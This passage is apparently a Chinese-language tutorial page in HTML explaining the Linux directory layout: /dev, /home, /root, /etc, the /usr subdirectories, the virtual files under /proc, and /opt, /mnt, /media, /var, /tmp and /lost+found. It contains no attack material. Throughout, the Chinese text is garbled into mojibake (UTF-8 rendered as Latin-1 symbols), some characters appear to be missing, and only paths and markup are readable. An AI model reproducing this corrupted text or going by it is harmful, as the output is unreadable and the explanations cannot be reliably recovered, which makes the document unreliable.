¹ç”¨æˆ·æ‰§è¡Œå‘½ä»¤æ—¶å€™æ‰€å¿…éœ€ç”¨åˆ°çš„å…±äº«åº“ã€‚åšä¸ªä¸å¤ªå¥½ä½†æ˜¯æ¯”è¾ƒå½¢è±¡çš„æ¯”å–»ï¼Œç‚¹ç±»ä¼¼äºWindowsä¸Šé¢çš„system32ç›®å½•ã€‚ç†è¯´ï¼Œè¿™é‡Œå­˜æ”¾çš„æ–‡ä»¶åº”è¯¥æ˜¯/binç›®å½•ä¸‹ç¨‹åºæ‰€éœ€è¦çš„åº“æ–‡ä»¶çš„å­˜æ”¾åœ°ï¼Œä¹Ÿä¸æ’é™¤ä¸€äº›ä¾‹å¤–çš„æƒ…å†µã€‚ç±»ä¼¼çš„ç›®å½•è¿˜/usr/libï¼Œ/usr/local/libç­‰ç­‰ã€‚</p><h3 id="dev"><a href="#dev" class="headerlink" title="/dev"></a>/dev</h3><p>è®¾å¤‡æ–‡ä»¶ç›®å½•ã€‚<br>åœ¨Linuxä¸­è®¾å¤‡éƒ½æ˜¯ä»¥æ–‡ä»¶å½¢å¼å‡ºç°ï¼Œè¿™é‡Œçš„è®¾å¤‡å¯ä»¥æ˜¯ç¡¬ç›˜ï¼Œé”®ç›˜ï¼Œé¼ æ ‡ï¼Œç½‘å¡ï¼Œç»ˆç«¯ï¼Œç­‰è®¾å¤‡ï¼Œé€šè¿‡è®¿é—®è¿™äº›æ–‡ä»¶å¯ä»¥è®¿é—®åˆ°ç›¸åº”çš„è®¾å¤‡ã€‚è®¾å¤‡æ–‡ä»¶å¯ä»¥ä½¿ç”¨mknodå‘½ä»¤æ¥åˆ›å»ºï¼Œå…·ä½“å‚è§ç›¸åº”çš„å‘½ä»¤ï¼›è€Œä¸ºäº†å°†å¯¹è¿™äº›è®¾å¤‡æ–‡ä»¶çš„è®¿é—®è½¬åŒ–ä¸ºå¯¹è®¾å¤‡çš„è®¿é—®ï¼Œéœ€è¦å‘ç›¸åº”çš„è®¾å¤‡æä¾›è®¾å¤‡é©±åŠ¨æ¨¡å—ï¼ˆä¸€èˆ¬å°†è®¾å¤‡é©±åŠ¨ç¼–è¯‘ä¹‹åï¼Œç”Ÿæˆçš„ç»“æœæ˜¯ä¸€ä¸ª*.koç±»å‹çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œåœ¨å†…æ ¸å¯åŠ¨ä¹‹åï¼Œå†é€šè¿‡insmodç­‰å‘½ä»¤åŠ è½½ç›¸åº”çš„è®¾å¤‡é©±åŠ¨ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è®¾å¤‡æ–‡ä»¶æ¥è®¿é—®è®¾å¤‡äº†ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œæƒ³è¦Linuxç³»ç»Ÿæ”¯æŒæŸä¸ªè®¾å¤‡ï¼Œåªè¦ä¸ªä¸œè¥¿ï¼šç›¸åº”çš„ç¡¬ä»¶è®¾å¤‡ï¼Œæ”¯æŒç¡¬ä»¶çš„é©±åŠ¨æ¨¡å—ï¼Œä»¥åŠç›¸åº”çš„è®¾å¤‡æ–‡ä»¶ã€‚</p><h3 id="home"><a href="#home" class="headerlink" title="/home"></a>/home</h3><p>æ™®é€šç”¨æˆ·çš„å®¶ç›®å½•ï¼ˆ$HOMEç›®å½•ã€‚<br>åœ¨Linuxæœºå™¨ä¸Šï¼Œç”¨æˆ·ä¸»ç›®å½•é€šå¸¸ç›´æ¥æˆ–é—´æ¥åœ°ç½®åœ¨æ­¤ç›®å½•ä¸‹ã€‚å…¶ç»“æ„é€šå¸¸ç”±æœ¬åœ°æœºçš„ç®¡ç†å‘˜æ¥å†³å®šã€‚é€šå¸¸è€Œè¨€ï¼Œç³»ç»Ÿçš„æ¯ä¸ªç”¨æˆ·éƒ½è‡ªå·±çš„å®¶ç›®å½•ï¼Œç›®å½•ä»¥ç”¨æˆ·åä½œä¸ºåå­—å­˜æ”¾åœ¨/homeä¸‹é¢ï¼ˆä¾‹å¦‚quietheartç”¨æˆ·ï¼Œå…¶å®¶ç›®å½•çš„åå­—ä¸º/home/quietheartã€‚è¯¥ç›®å½•ä¸­ä¿å­˜äº†ç»å¤§å¤šæ•°çš„ç”¨æˆ·æ–‡ä»¶(ç”¨æˆ·è‡ªå·±çš„é…ç½®æ–‡ä»¶ï¼Œå®šåˆ¶æ–‡ä»¶ï¼Œæ–‡æ¡£ï¼Œæ•°æ®ç­‰)ï¼Œrootç”¨æˆ·é™¤å¤–ï¼ˆå‚è§åé¢çš„/rootç›®å½•ã€‚ç”±äºè¿™ä¸ªç›®å½•åŒ…å«äº†ç”¨æˆ·å®é™…çš„æ•°æ®ï¼Œé€šå¸¸ç³»ç»Ÿç®¡ç†å‘˜ä¸ºè¿™ä¸ªç›®å½•å•ç‹¬æŒ‚è½½ä¸€ä¸ªç‹¬ç«‹çš„ç£ç›˜åˆ†åŒºï¼Œè¿™æ ·è¿™ä¸ªç›®å½•çš„æ–‡ä»¶ç³»ç»Ÿæ ¼å¼å°±å¯èƒ½å’Œå…¶ä»–ç›®å½•ä¸ä¸€æ ·äº†ï¼ˆå°½ç®¡è¡¨é¢ä¸Šçœ‹ï¼Œè¿™ä¸ªç›®å½•è¿˜æ˜¯å±äºæ ¹ç›®å½•çš„ä¸€æ£µå­æ ‘ä¸Šï¼‰ï¼Œæœ‰åˆ©äºæ•°æ®çš„ç»´æŠ¤ã€‚</p><h3 id="root"><a href="#root" class="headerlink" title="/root"></a>/root</h3><p>ç”¨æˆ·rootçš„$HOMEç›®å½•<br>ç³»ç»Ÿç®¡ç†å‘˜(å°±æ˜¯rootç”¨æˆ·æˆ–è¶…çº§ç”¨æˆ·)çš„ä¸»ç›®å½•æ¯”è¾ƒç‰¹æ®Šï¼Œä¸å­˜æ”¾åœ¨/homeä¸­ï¼Œè€Œæ˜¯ç›´æ¥æ”¾åœ¨/rootç›®å½•ä¸‹äº†ã€‚</p><h3 id="etc"><a href="#etc" class="headerlink" title="/etc"></a>/etc</h3><p>å…¨å±€çš„é…ç½®æ–‡ä»¶å­˜æ”¾ç›®å½•ã€‚<br>ç³»ç»Ÿå’Œç¨‹åºä¸€èˆ¬éƒ½å¯ä»¥é€šè¿‡ä¿®æ”¹ç›¸åº”çš„é…ç½®æ–‡ä»¶ï¼Œæ¥è¿›è¡Œé…ç½®ã€‚ä¾‹å¦‚ï¼Œè¦é…ç½®ç³»ç»Ÿå¼€æœºçš„æ—¶å€™å¯åŠ¨é‚£äº›ç¨‹åºï¼Œé…ç½®æŸä¸ªç¨‹åºå¯åŠ¨çš„æ—¶å€™æ˜¾ç¤ºä»€ä¹ˆæ ·çš„é£æ ¼ç­‰ç­‰ã€‚é€šå¸¸è¿™äº›é…ç½®æ–‡ä»¶éƒ½é›†ä¸­å­˜æ”¾åœ¨/etcç›®å½•ä¸­ï¼Œæ‰€ä»¥æƒ³è¦é…ç½®ä»€ä¹ˆä¸œè¥¿çš„è¯ï¼Œå¯ä»¥åœ¨/etcä¸‹é¢å¯»æ‰¾æˆ‘ä»¬å¯èƒ½éœ€è¦ä¿®æ”¹çš„æ–‡ä»¶ã€‚ä¸€äº›å¤§å‹å¥—ä»¶ï¼Œå¦‚X11ï¼Œåœ¨ /etc ä¸‹å®ƒä»¬è‡ªå·±çš„å­ç›®å½•ã€‚ç³»ç»Ÿé…ç½®æ–‡ä»¶å¯ä»¥æ”¾åœ¨è¿™é‡Œæˆ–åœ¨ /usr/etcã€‚ ä¸è¿‡æ‰€ç¨‹åºæ€»æ˜¯åœ¨ /etc ç›®å½•ä¸‹æŸ¥æ‰¾æ‰€éœ€çš„é…ç½®æ–‡ä»¶ï¼Œä½ ä¹Ÿå¯ä»¥å°†è¿™äº›æ–‡ä»¶é“¾æ¥åˆ°ç›®å½• /usr/etcã€‚å¦å¤–ï¼Œè¿˜ä¸€ä¸ªéœ€è¦æ³¨æ„çš„å¸¸è§ç°è±¡å°±æ˜¯ï¼Œå½“æŸä¸ªç¨‹åºåœ¨æŸä¸ªç”¨æˆ·ä¸‹è¿è¡Œçš„æ—¶å€™ï¼Œå¯èƒ½ä¼šåœ¨è¯¥ç”¨æˆ·çš„å®¶ç›®å½•ä¸­ç”Ÿæˆä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼ˆä¸€èˆ¬è¿™ä¸ªæ–‡ä»¶æœ€å¼€å§‹å°±æ˜¯/etcä¸‹ç›¸åº”é…ç½®æ–‡ä»¶çš„æ‹·è´ï¼Œå­˜æ”¾ç›¸åº”äºâ€œå½“å‰ç”¨æˆ·â€çš„é…ç½®ï¼Œè¿™æ ·å½“å‰ç”¨æˆ·å¯ä»¥é€šè¿‡é…ç½®è¿™ä¸ªå®¶ç›®å½•çš„é…ç½®æ–‡ä»¶ï¼Œæ¥æ”¹å˜ç¨‹åºçš„è¡Œä¸ºï¼Œå¹¶ä¸”è¿™ä¸ªè¡Œä¸ºåªæ˜¯è¯¥ç”¨æˆ·ç‰¹çš„ã€‚åŸå› å°±æ˜¯ï¼šä¸€èˆ¬æ¥è¯´ä¸€ä¸ªç¨‹åºå¯åŠ¨ï¼Œå¦‚æœéœ€è¦è¯»å–ä¸€äº›é…ç½®æ–‡ä»¶çš„è¯ï¼Œå®ƒä¼šé¦–å…ˆè¯»å–å½“å‰ç”¨æˆ·å®¶ç›®å½•çš„é…ç½®æ–‡ä»¶ï¼Œå¦‚æœå­˜åœ¨å°±ä½¿ç”¨ï¼›å¦‚æœä¸å­˜åœ¨å®ƒå°±åˆ°/etcä¸‹è¯»å–å…¨å±€çš„é…ç½®æ–‡ä»¶è¿›è€Œå¯åŠ¨ç¨‹åºã€‚å°±æ˜¯è¿™ä¸ªé…ç½®æ–‡ä»¶ä¸è‡ªåŠ¨ç”Ÿæˆï¼Œæˆ‘ä»¬æ‰‹åŠ¨åœ¨è‡ªå·±çš„å®¶ç›®å½•ä¸­åˆ›å»ºä¸€ä¸ªæ–‡ä»¶çš„è¯ï¼Œä¹Ÿæœ‰è®¸å¤šç¨‹åºä¼šé¦–å…ˆè¯»å–åˆ°è¿™ä¸ªå®¶ç›®å½•çš„æ–‡ä»¶å¹¶ä¸”ä»¥å®ƒçš„é…ç½®ä½œä¸ºå¯åŠ¨çš„é€‰é¡¹ï¼ˆä¾‹å¦‚æˆ‘ä»¬å¯ä»¥åœ¨å®¶ç›®å½•ä¸­åˆ›å»ºvimç¨‹åºçš„é…ç½®æ–‡ä»¶.vimrcï¼Œæ¥é…ç½®è‡ªå·±çš„vimç¨‹åºã€‚</p><h3 id="usr"><a href="#usr" class="headerlink" title="/usr"></a>/usr</h3><p>è¿™ä¸ªç›®å½•ä¸­åŒ…å«äº†å‘½ä»¤åº“æ–‡ä»¶å’Œåœ¨é€šå¸¸æ“ä½œä¸­ä¸ä¼šä¿®æ”¹çš„æ–‡ä»¶ã€‚<br>è¿™ä¸ªç›®å½•å¯¹äºç³»ç»Ÿæ¥è¯´ä¹Ÿæ˜¯ä¸€ä¸ªéå¸¸é‡è¦çš„ç›®å½•ï¼Œå…¶åœ°ä½ç±»ä¼¼Windowsä¸Šé¢çš„â€Program Filesâ€ç›®å½•ï¼ˆè¯·åŸè°…æˆ‘å¯èƒ½è¿™æ ·åšæ¯”è¾ƒä¸å¤ªæ°å½“^_^ã€‚å®‰è£…ç¨‹åºçš„æ—¶å€™ï¼Œé»˜è®¤å°±æ˜¯å®‰è£…åœ¨æ­¤æ–‡ä»¶å†…éƒ¨æŸä¸ªå­æ–‡ä»¶å¤¹å†…ã€‚è¾“å…¥å‘½ä»¤åç³»ç»Ÿé»˜è®¤æ‰§è¡Œ/usr/binä¸‹çš„ç¨‹åºï¼ˆå½“ç„¶ï¼Œå‰ææ˜¯è¿™ä¸ªç›®å½•çš„è·¯å¾„å·²ç»è¢«æ·»åŠ åˆ°äº†ç³»ç»Ÿçš„ç¯å¢ƒå˜é‡ä¸­ã€‚æ­¤ç›®å½•é€šå¸¸ä¹Ÿä¼šæŒ‚è½½ä¸€ä¸ªç‹¬ç«‹çš„ç£ç›˜åˆ†åŒºï¼Œå®ƒåº”ä¿å­˜å…±äº«åªè¯»ç±»æ–‡ä»¶ï¼Œè¿™æ ·å®ƒå¯ä»¥è¢«è¿è¡ŒLinuxçš„ä¸åŒä¸»æœºæŒ‚è½½ã€‚</p><h3 id="usr-lib"><a href="#usr-lib" class="headerlink" title="/usr/lib"></a>/usr/lib</h3><p>ç›®æ ‡åº“æ–‡ä»¶ï¼ŒåŒ…æ‹¬åŠ¨æ€è¿æ¥åº“åŠ ä¸Šä¸€äº›é€šå¸¸ä¸æ˜¯ç›´æ¥è°ƒç”¨çš„å¯æ‰§è¡Œæ–‡ä»¶çš„å­˜æ”¾ä½ç½®ã€‚<br>è¿™ä¸ªç›®å½•åŠŸèƒ½ç±»ä¼¼/libç›®å½•ï¼Œç†è¯´ï¼Œè¿™é‡Œå­˜æ”¾çš„æ–‡ä»¶åº”è¯¥æ˜¯/binç›®å½•ä¸‹ç¨‹åºæ‰€éœ€è¦çš„åº“æ–‡ä»¶çš„å­˜æ”¾åœ°ï¼Œä¹Ÿä¸æ’é™¤ä¸€äº›ä¾‹å¤–çš„æƒ…å†µã€‚</p><h3 id="usr-bin"><a href="#usr-bin" class="headerlink" title="/usr/bin"></a>/usr/bin</h3><p>ä¸€èˆ¬ä½¿ç”¨è€…ä½¿ç”¨å¹¶ä¸”ä¸æ˜¯ç³»ç»Ÿè‡ªæ£€ç­‰æ‰€å¿…éœ€å¯æ‰§è¡Œæ–‡ä»¶çš„ç›®å½•ã€‚<br>æ­¤ç›®å½•ç›¸å½“äºæ ¹æ–‡ä»¶ç³»ç»Ÿä¸‹çš„å¯¹åº”ç›®å½•ï¼ˆ/binï¼Œéå¯åŠ¨ç³»ç»Ÿï¼Œéä¿®å¤ç³»ç»Ÿä»¥åŠéæœ¬åœ°å®‰è£…çš„ç¨‹åºä¸€èˆ¬éƒ½æ”¾åœ¨æ­¤ç›®å½•ä¸‹ã€‚</p><h3 id="usr-sbin"><a href="#usr-sbin" class="headerlink" title="/usr/sbin"></a>/usr/sbin</h3><p>ç®¡ç†å‘˜ä½¿ç”¨çš„éç³»ç»Ÿå¿…é¡»çš„å¯æ‰§è¡Œæ–‡ä»¶å­˜æ”¾ç›®å½•ã€‚<br>æ­¤ç›®å½•ç›¸å½“äºæ ¹æ–‡ä»¶ç³»ç»Ÿä¸‹çš„å¯¹åº”ç›®å½•ï¼ˆ/sbinï¼Œä¿å­˜ç³»ç»Ÿç®¡ç†ç¨‹åºçš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¹¶ä¸”è¿™äº›æ–‡ä»¶ä¸æ˜¯ç³»ç»Ÿå¯åŠ¨æˆ–æ–‡ä»¶ç³»ç»ŸæŒ‚è½½ /usr ç›®å½•æˆ–ä¿®å¤ç³»ç»Ÿæ‰€å¿…éœ€çš„ã€‚</p><h3 id="usr-share"><a href="#usr-share" class="headerlink" title="/usr/share"></a>/usr/share</h3><p>å­˜æ”¾å…±äº«æ–‡ä»¶çš„ç›®å½•ã€‚<br>åœ¨æ­¤ç›®å½•ä¸‹ä¸åŒçš„å­ç›®å½•ä¸­ä¿å­˜äº†åŒä¸€ä¸ªæ“ä½œç³»ç»Ÿåœ¨ä¸åŒæ„æ¶ä¸‹å·¥ä½œæ—¶ç‰¹å®šåº”ç”¨ç¨‹åºçš„å…±äº«æ•°æ®(ä¾‹å¦‚ç¨‹åºæ–‡æ¡£ä¿¡æ¯)ã€‚ä½¿ç”¨è€…å¯ä»¥æ‰¾åˆ°é€šå¸¸æ”¾åœ¨ /usr/doc æˆ– /usr/lib æˆ– /usr/man ç›®å½•ä¸‹çš„è¿™äº›ç±»ä¼¼æ•°æ®ã€‚</p><h3 id="usr-include"><a href="#usr-include" class="headerlink" title="/usr/include"></a>/usr/include</h3><p>Cç¨‹åºè¯­è¨€ç¼–è¯‘ä½¿ç”¨çš„å¤´æ–‡ä»¶ã€‚<br>linuxä¸‹å¼€å‘å’Œç¼–è¯‘åº”ç”¨ç¨‹åºæ‰€éœ€è¦çš„å¤´æ–‡ä»¶ä¸€èˆ¬éƒ½å­˜æ”¾åœ¨è¿™é‡Œï¼Œé€šè¿‡å¤´æ–‡ä»¶æ¥ä½¿ç”¨æŸäº›åº“å‡½æ•°ã€‚é»˜è®¤æ¥è¯´è¿™ä¸ªè·¯å¾„è¢«æ·»åŠ åˆ°äº†ç¯å¢ƒå˜é‡ä¸­ï¼Œè¿™æ ·ç¼–è¯‘å¼€å‘ç¨‹åºçš„æ—¶å€™ç¼–è¯‘å™¨ä¼šè‡ªåŠ¨æœç´¢è¿™ä¸ªè·¯å¾„ï¼Œä»ä¸­æ‰¾åˆ°ä½ çš„ç¨‹åºä¸­å¯èƒ½åŒ…å«çš„å¤´æ–‡ä»¶ã€‚</p><h3 id="usr-local"><a href="#usr-local" class="headerlink" title="/usr/local"></a>/usr/local</h3><p>å®‰è£…æœ¬åœ°ç¨‹åºçš„ä¸€èˆ¬é»˜è®¤è·¯å¾„ã€‚<br>å½“æˆ‘ä»¬ä¸‹è½½ä¸€ä¸ªç¨‹åºæºä»£ç ï¼Œç¼–è¯‘å¹¶ä¸”å®‰è£…çš„æ—¶å€™ï¼Œå¦‚æœä¸ç‰¹åˆ«æŒ‡å®šå®‰è£…çš„ç¨‹åºè·¯å¾„ï¼Œé‚£ä¹ˆé»˜è®¤ä¼šå°†ç¨‹åºç›¸å…³çš„æ–‡ä»¶å®‰è£…åˆ°è¿™ä¸ªç›®å½•çš„å¯¹åº”ç›®å½•ä¸‹ã€‚ä¾‹å¦‚ï¼Œå®‰è£…çš„ç¨‹åºå¯æ‰§è¡Œæ–‡ä»¶è¢«å®‰è£…ï¼ˆå®‰è£…å®è´¨å°±æ˜¯å¤åˆ¶åˆ°äº†/usr/local/binä¸‹é¢ï¼Œæ­¤ç¨‹åºï¼ˆå¯æ‰§è¡Œæ–‡ä»¶æ‰€éœ€è¦ä¾èµ–çš„åº“æ–‡ä»¶è¢«å®‰è£…åˆ°äº†/usr/local/libç›®å½•ä¸‹ï¼Œè¢«å®‰è£…çš„è½¯ä»¶å¦‚æœæ˜¯æŸä¸ªå¼€å‘åº“ï¼ˆä¾‹å¦‚Qtï¼ŒGtkç­‰é‚£ä¹ˆç›¸åº”çš„å¤´æ–‡ä»¶å¯èƒ½å°±è¢«å®‰è£…åˆ°äº†/usr/local/includeä¸­ç­‰ç­‰ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™ä¸ªç›®å½•å­˜æ”¾çš„å†…å®¹ï¼Œä¸€èˆ¬éƒ½æ˜¯æˆ‘ä»¬åæ¥è‡ªå·±å®‰è£…çš„è½¯ä»¶çš„é»˜è®¤è·¯å¾„ï¼Œå¦‚æœæ‹©äº†è¿™ä¸ªé»˜è®¤è·¯å¾„ä½œä¸ºè½¯ä»¶çš„å®‰è£…è·¯å¾„ï¼Œè¢«å®‰è£…çš„è½¯ä»¶çš„æ‰€æ–‡ä»¶éƒ½é™åˆ¶åœ¨è¿™ä¸ªç›®å½•ä¸­ï¼Œå…¶ä¸­çš„å­ç›®å½•å°±ç›¸åº”äºæ ¹ç›®å½•çš„å­ç›®å½•ã€‚</p><h3 id="proc"><a href="#proc" class="headerlink" title="/proc"></a>/proc</h3><p>ç‰¹æ®Šæ–‡ä»¶ç›®å½•ã€‚<br>è¿™ä¸ªç›®å½•é‡‡ç”¨ä¸€ç§ç‰¹æ®Šçš„æ–‡ä»¶ç³»ç»Ÿæ ¼å¼ï¼ˆprocæ ¼å¼ï¼Œå†…æ ¸æ”¯æŒè¿™ç§æ ¼å¼ã€‚å…¶ä¸­åŒ…å«äº†å…¨éƒ¨è™šæ‹Ÿæ–‡ä»¶ã€‚å®ƒä»¬å¹¶ä¸ä¿å­˜åœ¨ç£ç›˜ä¸­ï¼Œä¹Ÿä¸å æ®ç£ç›˜ç©ºé—´(å°½ç®¡å‘½ä»¤ls -cä¼šæ˜¾ç¤ºå®ƒä»¬çš„å¤§å°)ã€‚å½“æ‚¨æŸ¥çœ‹å®ƒä»¬æ—¶ï¼Œæ‚¨å®é™…ä¸Šçœ‹åˆ°çš„æ˜¯å†…å­˜é‡Œçš„ä¿¡æ¯ï¼Œè¿™äº›æ–‡ä»¶åŠ©äºæˆ‘ä»¬äº†è§£ç³»ç»Ÿå†…éƒ¨ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼š<br>â”œ1/ å…³äºè¿›ç¨‹1çš„ä¿¡æ¯ç›®å½•ã€‚æ¯ä¸ªè¿›ç¨‹åœ¨/proc ä¸‹ä¸€ä¸ªåä¸ºå…¶è¿›ç¨‹å·çš„ç›®å½•ã€‚<br>â”œcpuinfo å¤„ç†å™¨ä¿¡æ¯ï¼Œå¦‚ç±»å‹ã€åˆ¶é€ å•†ã€å‹å·å’Œæ€§èƒ½ã€‚<br>â”œdevices å½“å‰è¿è¡Œçš„æ ¸å¿ƒé…ç½®çš„è®¾å¤‡é©±åŠ¨çš„åˆ—è¡¨ã€‚<br>â”œdma æ˜¾ç¤ºå½“å‰ä½¿ç”¨çš„DMAé€šé“ã€‚<br>â”œfilesystems æ ¸å¿ƒé…ç½®çš„æ–‡ä»¶ç³»ç»Ÿã€‚<br>â”œinterrupts æ˜¾ç¤ºä½¿ç”¨çš„ä¸­æ–­ï¼Œand how many of each there have been.<br>â”œioports å½“å‰ä½¿ç”¨çš„I/Oç«¯å£ã€‚<br>â”œkcore ç³»ç»Ÿç‰©ç†å†…å­˜æ˜ è±¡ã€‚ä¸ç‰©ç†å†…å­˜å¤§å°ä¸€æ ·ï¼Œä½†å®é™…ä¸å è¿™ä¹ˆå¤šå†…å­˜ï¼›<br>â”œkmsg æ ¸å¿ƒè¾“å‡ºçš„æ¶ˆæ¯ã€‚ä¹Ÿè¢«é€åˆ°syslog ã€‚<br>â”œksyms æ ¸å¿ƒç¬¦å·è¡¨ã€‚<br>â”œloadavg ç³»ç»Ÿâ€å¹³å‡è´Ÿè½½â€ï¼›3ä¸ªæ²¡æ„ä¹‰çš„æŒ‡ç¤ºå™¨æŒ‡å‡ºç³»ç»Ÿå½“å‰çš„å·¥ä½œé‡ã€‚<br>â”œmeminfo å­˜å‚¨å™¨ä½¿ç”¨ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç‰©ç†å†…å­˜å’Œswapã€‚<br>â”œmodules å½“å‰åŠ è½½äº†å“ªäº›æ ¸å¿ƒæ¨¡å—ã€‚<br>â”œnet ç½‘ç»œåè®®çŠ¶æ€ä¿¡æ¯ã€‚<br>â”œself åˆ°æŸ¥çœ‹/proc çš„ç¨‹åºçš„è¿›ç¨‹ç›®å½•çš„ç¬¦å·è¿æ¥ã€‚<br>â”œstat ç³»ç»Ÿçš„ä¸åŒçŠ¶æ€<br>â”œuptime ç³»ç»Ÿå¯åŠ¨çš„æ—¶é—´é•¿åº¦ã€‚<br>â””version æ ¸å¿ƒç‰ˆæœ¬ã€‚</p><h3 id="opt"><a href="#opt" class="headerlink" title="/opt"></a>/opt</h3><p>å¯æ‹©çš„æ–‡ä»¶ç›®å½•ã€‚<br>è¿™ä¸ªç›®å½•è¡¨ç¤ºçš„æ˜¯å¯æ‹©çš„æ„æ€ï¼Œäº›è‡ªå®šä¹‰è½¯ä»¶åŒ…æˆ–è€…ç¬¬æ–¹å·¥å…·ï¼Œå°±å¯ä»¥å®‰è£…åœ¨è¿™é‡Œã€‚æ¯”å¦‚åœ¨Fedora Core 5.0ä¸­ï¼ŒOpenOfficeå°±æ˜¯å®‰è£…åœ¨è¿™é‡Œã€‚äº›æˆ‘ä»¬è‡ªå·±ç¼–è¯‘çš„è½¯ä»¶åŒ…ï¼Œå°±å¯ä»¥å®‰è£…åœ¨è¿™ä¸ªç›®å½•ä¸­ï¼›é€šè¿‡æºç åŒ…å®‰è£…çš„è½¯ä»¶ï¼Œå¯ä»¥æŠŠå®ƒä»¬çš„å®‰è£…è·¯å¾„è®¾ç½®æˆ/optè¿™æ ·æ¥å®‰è£…ã€‚è¿™ä¸ªç›®å½•çš„ä½œç”¨ä¸€ç‚¹ç±»ä¼¼/usr/localã€‚</p><h3 id="mnt"><a href="#mnt" class="headerlink" title="/mnt"></a>/mnt</h3><p>ä¸´æ—¶æŒ‚è½½ç›®å½•ã€‚<br>è¿™ä¸ªç›®å½•ä¸€èˆ¬æ˜¯ç”¨äºå­˜æ”¾æŒ‚è½½å‚¨å­˜è®¾å¤‡çš„æŒ‚è½½ç›®å½•çš„ï¼Œæ¯”å¦‚ç£ç›˜ï¼Œå…‰é©±ï¼Œç½‘ç»œæ–‡ä»¶ç³»ç»Ÿç­‰ï¼Œå½“æˆ‘ä»¬éœ€è¦æŒ‚è½½æŸä¸ªç£ç›˜è®¾å¤‡çš„æ—¶å€™ï¼Œå¯ä»¥æŠŠç£ç›˜è®¾å¤‡æŒ‚è½½åˆ°è¿™ä¸ªç›®å½•ä¸Šå»ï¼Œè¿™æ ·æˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡è®¿é—®è¿™ä¸ªç›®å½•æ¥è®¿é—®é‚£ä¸ªç£ç›˜äº†ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬æœ€å¥½åœ¨/mntç›®å½•ä¸‹é¢å¤šå»ºç«‹å‡ ä¸ªå­ç›®å½•ï¼ŒæŒ‚è½½çš„æ—¶å€™æŒ‚è½½åˆ°è¿™äº›å­ç›®å½•ä¸Šé¢ï¼Œå› ä¸ºé€šå¸¸æˆ‘ä»¬å¯èƒ½ä¸ä»…ä»…æ˜¯æŒ‚è½½ä¸€ä¸ªè®¾å¤‡å§?</p><h3 id="media"><a href="#media" class="headerlink" title="/media"></a>/media</h3><p>æŒ‚è½½çš„åª’ä½“è®¾å¤‡ç›®å½•ã€‚<br>æŒ‚è½½çš„åª’ä½“è®¾å¤‡ç›®å½•ï¼Œä¸€èˆ¬å¤–éƒ¨è®¾å¤‡æŒ‚è½½åˆ°è¿™é‡Œï¼Œä¾‹å¦‚cdromç­‰ã€‚æ¯”å¦‚æˆ‘ä»¬æ’å…¥ä¸€ä¸ªUç›˜ï¼Œæˆ‘ä»¬ä¸€èˆ¬ä¼šå‘ç°ï¼ŒLinuxè‡ªåŠ¨åœ¨è¿™ä¸ªç›®å½•ä¸‹å»ºç«‹ä¸€ä¸ªdiskç›®å½•ï¼Œç„¶åæŠŠUç›˜æŒ‚è½½åˆ°è¿™ä¸ªdiskç›®å½•ä¸Šï¼Œé€šè¿‡è®¿é—®è¿™ä¸ªdiskæ¥è®¿é—®Uç›˜ã€‚</p><h3 id="var"><a href="#var" class="headerlink" title="/var"></a>/var</h3><p>å†…å®¹ç»å¸¸å˜åŒ–çš„ç›®å½•ã€‚<br>æ­¤ç›®å½•ä¸‹æ–‡ä»¶çš„å¤§å°å¯èƒ½ä¼šæ”¹å˜ï¼Œå¦‚ç¼“å†²æ–‡ä»¶ï¼Œæ—¥å¿—æ–‡ä»¶ï¼Œç¼“å­˜æ–‡ä»¶ï¼Œç­‰ä¸€èˆ¬éƒ½å­˜æ”¾åœ¨è¿™é‡Œã€‚</p><h3 id="tmp"><a href="#tmp" class="headerlink" title="/tmp"></a>/tmp</h3><p>ä¸´æ—¶æ–‡ä»¶ç›®å½•ã€‚<br>è¯¥ç›®å½•å­˜æ”¾ç³»ç»Ÿä¸­çš„ä¸€äº›ä¸´æ—¶æ–‡ä»¶ï¼Œæ–‡ä»¶å¯èƒ½ä¼šè¢«ç³»ç»Ÿè‡ªåŠ¨æ¸…ç©ºã€‚çš„ç³»ç»Ÿç›´æ¥æŠŠtmpfsç±»å‹çš„æ–‡ä»¶ç³»ç»ŸæŒ‚è½½åˆ°è¿™ä¸ªç›®å½•ä¸Šï¼Œtmpfsæ–‡ä»¶ç³»ç»Ÿç”±Linuxå†…æ ¸æ”¯æŒï¼Œåœ¨è¿™ä¸ªæ–‡ä»¶ç³»ç»Ÿä¸­çš„æ•°æ®ï¼Œå®é™…ä¸Šæ˜¯å†…å­˜ä¸­çš„ï¼Œç”±äºå†…å­˜çš„æ•°æ®æ–­ç”µæ˜“å¤±ï¼Œå½“ç³»ç»Ÿé‡æ–°å¯åŠ¨çš„æ—¶å€™æˆ‘ä»¬å°±ä¼šå‘ç°è¿™ä¸ªç›®å½•è¢«æ¸…ç©ºäº†ã€‚</p><h3 id="lost-found"><a href="#lost-found" class="headerlink" title="/lost+found"></a>/lost+found</h3><p>æ¢å¤æ–‡ä»¶å­˜æ”¾çš„ä½ç½®ã€‚<br>å½“ç³»ç»Ÿå´©æºƒçš„æ—¶å€™ï¼Œåœ¨ç³»ç»Ÿä¿®å¤è¿‡ç¨‹ä¸­éœ€è¦æ¢å¤çš„æ–‡ä»¶ï¼Œå¯èƒ½å°±ä¼šåœ¨è¿™é‡Œè¢«æ‰¾åˆ°äº†ï¼Œè¿™ä¸ªç›®å½•ä¸€èˆ¬ä¸ºç©ºã€‚</p><p>å¦å¤–ï¼Œæœ‰äº›ç›®å½•åˆå­¦è€…å®¹æ˜“æ··æ·†ï¼Œè¿™é‡Œç®€å•åŒºåˆ†ä¸€ä¸‹ï¼š<br><strong>/bin,/sbinä¸/usr/bin,/usr/sbin:</strong><br>/binä¸€èˆ¬å­˜æ”¾å¯¹äºç”¨æˆ·å’Œç³»ç»Ÿæ¥è¯´â€œå¿…é¡»â€çš„ç¨‹åºï¼ˆäºŒè¿›åˆ¶æ–‡ä»¶ï¼‰ã€‚<br>/sbinä¸€èˆ¬å­˜æ”¾ç”¨äºç³»ç»Ÿç®¡ç†çš„â€œå¿…éœ€â€çš„ç¨‹åºï¼ˆäºŒè¿›åˆ